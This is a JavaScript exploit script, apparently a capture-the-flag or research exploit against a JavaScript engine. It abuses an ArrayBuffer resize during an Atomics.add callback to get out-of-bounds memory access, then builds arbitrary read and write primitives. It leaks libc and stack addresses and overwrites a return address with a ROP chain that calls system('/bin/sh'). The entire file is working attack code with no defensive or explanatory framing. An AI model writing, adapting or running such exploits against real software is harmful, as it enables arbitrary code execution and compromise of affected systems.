// Exploit v4 - Simplified, no verification reads after writing ROP chain

function hex(n) {
    if (typeof n === 'bigint') {
        if (n < 0n) return '-' + hex(-n);
        return '0x' + n.toString(16);
    }
    return '0x' + n.toString(16);
}

// ========== CONSTANTS ==========
const MAIN_ARENA_OFFSET = 0x1e7ac0n;
const SYSTEM_OFFSET = 0x53110n;
const BINSH_OFFSET = 0x1a7ea4n;
const POP_RDI_RET_OFFSET = 0x2a145n;
const RET_OFFSET = 0x2846bn;
const ENVIRON_OFFSET = 0x1eee28n;

// ========== SETUP ==========
let padding = [];
for (let i = 0; i < 100; i++) {
    padding.push(new ArrayBuffer(56));
}

let victimAB = new ArrayBuffer(56, { maxByteLength: 4096 });
let victimView32 = new Int32Array(victimAB);
let oobBuffer = null;

Atomics.add(victimView32, 0, {
    valueOf: function() {
        victimAB.resize(4096);
        oobBuffer = new ArrayBuffer(64);
        return 0x100000 - 64;
    }
});

let oobView = new BigUint64Array(oobBuffer);

let sprayBuffers = [];
let sprayViews = [];
const SPRAY_COUNT = 100;

for (let i = 0; i < SPRAY_COUNT; i++) {
    let ab = new ArrayBuffer(64);
    let view = new BigUint64Array(ab);
    view[0] = 0xCAFE00000000n | BigInt(i);
    sprayBuffers.push(ab);
    sprayViews.push(view);
}

// Find structures
const AB_SIGNATURE = 0xFFFFFFFF00000040n;
let foundStructs = [];
for (let i = 8; i < Math.min(oobView.length, 10000); i++) {
    if (oobView[i] === AB_SIGNATURE && oobView[i+1] === 0n) {
        let dataPtr = oobView[i+2];
        if ((dataPtr >> 40n) >= 0x55n && (dataPtr >> 40n) <= 0x7Fn) {
            foundStructs.push({ offset: i, dataPtr: dataPtr });
        }
    }
}

let struct0 = foundStructs[0];
let oobBase = struct0.dataPtr - BigInt((struct0.offset + 8) * 8);

// Find TypedArray pointer
let arbPtrOffset = -1;
let arbSprayIdx = -1;
let origArbPtr = 0n;

for (let si = 0; si < foundStructs.length; si++) {
    let struct = foundStructs[si];
    let dataPtr = struct.dataPtr;
    let dataPtrInAB = struct.offset + 2;

    for (let i = dataPtrInAB + 1; i < Math.min(dataPtrInAB + 50, oobView.length); i++) {
        if (oobView[i] === dataPtr) {
            let dataOobIndex = Number((dataPtr - oobBase) / 8n);
            if (dataOobIndex >= 0 && dataOobIndex < oobView.length) {
                let marker = oobView[dataOobIndex];
                if ((marker & 0xFFFF00000000n) === 0xCAFE00000000n) {
                    let sprayIdx = Number(marker & 0xFFFFFFFFn);
                    if (sprayIdx >= 0 && sprayIdx < SPRAY_COUNT) {
                        arbPtrOffset = i;
                        arbSprayIdx = sprayIdx;
                        origArbPtr = dataPtr;
                        break;
                    }
                }
            }
        }
    }
    if (arbPtrOffset >= 0) break;
}

let victimView = sprayViews[arbSprayIdx];

function arbRead64(addr) {
    oobView[arbPtrOffset] = addr;
    let val = victimView[0];
    oobView[arbPtrOffset] = origArbPtr;
    return val;
}

function arbWrite64(addr, val) {
    oobView[arbPtrOffset] = addr;
    victimView[0] = val;
    oobView[arbPtrOffset] = origArbPtr;
}

// Leak libc
let libcLeakAB = new ArrayBuffer(0x500, { maxByteLength: 0x2000 });
let libcLeakView = new BigUint64Array(libcLeakAB);
let barrier = new ArrayBuffer(4096);

let libcLeak = Atomics.add(libcLeakView, 0, {
    valueOf: function() {
        libcLeakAB.resize(0x2000);
        return 0n;
    }
});

let libcBase = libcLeak - 0x60n - MAIN_ARENA_OFFSET;

let systemAddr = libcBase + SYSTEM_OFFSET;
let binshAddr = libcBase + BINSH_OFFSET;
let popRdiRet = libcBase + POP_RDI_RET_OFFSET;
let retGadget = libcBase + RET_OFFSET;
let environAddr = libcBase + ENVIRON_OFFSET;

// Leak stack
let stackLeak = arbRead64(environAddr);

// Find return address from __libc_start_call_main (offset ~0x29ca8)
// This is typically at environ - 0x128 based on our earlier scan
let targetStackAddr = stackLeak - 0x128n;

// Write ROP chain - don't read back to verify, just write and exit
arbWrite64(targetStackAddr, retGadget);
arbWrite64(targetStackAddr + 8n, popRdiRet);
arbWrite64(targetStackAddr + 16n, binshAddr);
arbWrite64(targetStackAddr + 24n, systemAddr);

globalThis.keep = { padding, oobBuffer, oobView, sprayBuffers, sprayViews, barrier };
